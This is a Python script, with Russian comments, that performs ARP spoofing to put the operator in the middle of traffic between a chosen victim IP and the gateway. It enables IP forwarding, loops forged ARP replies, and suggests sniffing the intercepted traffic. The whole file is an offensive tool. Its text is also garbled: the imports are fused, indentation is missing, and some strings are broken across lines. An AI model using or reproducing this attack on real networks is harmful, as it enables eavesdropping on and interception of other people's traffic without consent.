#!/usr/bin/env python3
importimportimporttime
sys
argparse
import threading
import subprocess
from scapy.all import (
ARP, Ether, sendp, srp, get_if_hwaddr, conf
)
conf.verb = 0
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
running = True
def get_mac(ip: str, iface: str) -> str | None:
arp_request = ARP(pdst=ip)
broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
pkt = broadcast / arp_request
answered, _ = srp(pkt, timeout=3, iface=iface, verbose=False)
if answered:
return answered[0][1].hwsrc
return None
def enable_ip_forward():
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
capture_output=True)
print(f"{GREEN}[+] IP forwarding: ВКЛЮЧЁН{RESET}")
def disable_ip_forward():
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
capture_output=True)
print(f"{YELLOW}[-] IP forwarding: выключен{RESET}")
def spoof(target_ip: str, spoof_ip: str, target_mac: str,
our_mac: str, iface: str) -> None:
arp = ARP(
op=2,
 # op=2: ARP Reply (не Request)
pdst=target_ip, # Кому: жертва
hwdst=target_mac, # MAC жертвы
psrc=spoof_ip, # «Я — это spoof_ip (роутер/жертва)»
hwsrc=our_mac, # НАШ MAC
)
sendp(Ether(dst=target_mac) / arp, iface=iface, verbose=False)
def restore(target_ip: str, gateway_ip: str,
target_mac: str, gateway_mac: str, iface: str) -> None:
"""Восстанавливаем правильные ARP-записи после атаки."""
print(f"\n{YELLOW}[*] Восстанавливаем ARP таблицы...{RESET}")
# Говорим жертве правильный MAC роутера
arp_victim = ARP(
op=2,
pdst=target_ip,
hwdst=target_mac,
psrc=gateway_ip,
hwsrc=gateway_mac,
)
# Говорим роутеру правильный MAC жертвы
arp_gateway = ARP(
op=2,
pdst=gateway_ip,
hwdst=gateway_mac,
psrc=target_ip,
hwsrc=target_mac,
)
for _ in range(5):
sendp(Ether(dst=target_mac) / arp_victim, iface=iface, verbose=False)
sendp(Ether(dst=gateway_mac) / arp_gateway, iface=iface, verbose=False)
time.sleep(0.2)
print(f"{GREEN}[+] ARP таблицы восстановлены{RESET}")
def spoof_loop(victim_ip: str, gateway_ip: str,
victim_mac: str, gateway_mac: str,
our_mac: str, iface: str, interval: float) -> None:
"""Основной цикл спуфинга — шлём поддельные ARP каждые N секунд."""
global running
packets_sent = 0
while running:
spoof(victim_ip, gateway_ip, victim_mac, our_mac, iface)
spoof(gateway_ip, victim_ip, gateway_mac, our_mac, iface)
packets_sent += 2
print(f"\r{CYAN}[*] Пакетов отправлено: {packets_sent}{RESET}", end="")
time.sleep(interval)
def main():
parser = argparse.ArgumentParser(description="ARP Spoofer → MITM")
parser.add_argument("--victim", required=True, help="IP жертвы")
parser.add_argument("--gateway", required=True, help="IP шлюза/роутера")
parser.add_argument("-i", "--iface", default="eth0", help="Сетевой интерфейс")
parser.add_argument("--interval", type=float, default=2.0,
help="Интервал отправки ARP пакетов (сек)")
args = parser.parse_args()
import os
if os.geteuid() != 0:
print(f"{RED}[!] Нужен root{RESET}")
sys.exit(1)
print(f"{CYAN}[*] ARP Spoofer запускается...{RESET}")
print(f"{CYAN}[*] Жертва: {args.victim}{RESET}")
print(f"{CYAN}[*] Шлюз: {args.gateway}{RESET}")
print(f"{CYAN}[*] Iface: {args.iface}{RESET}")
print(f"\n{YELLOW}[*] Получаем MAC-адреса...{RESET}")
victim_mac = get_mac(args.victim, args.iface)
gateway_mac = get_mac(args.gateway, args.iface)
our_mac = get_if_hwaddr(args.iface)
if not victim_mac:
print(f"{RED}[!] Не удалось получить MAC жертвы. Цель
недоступна?{RESET}")
sys.exit(1)
if not gateway_mac:
print(f"{RED}[!] Не удалось получить MAC шлюза{RESET}")
sys.exit(1)
print(f"{GREEN}[+] MAC жертвы: {victim_mac}{RESET}")
print(f"{GREEN}[+] MAC шлюза: {gateway_mac}{RESET}")
print(f"{GREEN}[+] Наш MAC: {our_mac}{RESET}")
enable_ip_forward()
print(f"\n{GREEN}[+] Атака начата. Ctrl+C для остановки.{RESET}")
print(f"{YELLOW}[!] Теперь трафик между {args.victim} и {args.gateway}
проходит через нас{RESET}")
print(f"{YELLOW}[!] Используй Wireshark или packet_sniffer.py для
перехвата{RESET}\n")
global running
try:
spoof_loop(args.victim, args.gateway,
victim_mac, gateway_mac,
our_mac, args.iface, args.interval)
except KeyboardInterrupt:
running = False
restore(args.victim, args.gateway,
victim_mac, gateway_mac, args.iface)
disable_ip_forward()
print(f"\n{GREEN}[✓] Атака завершена корректно{RESET}")
if __name__ == "__main__":
main()
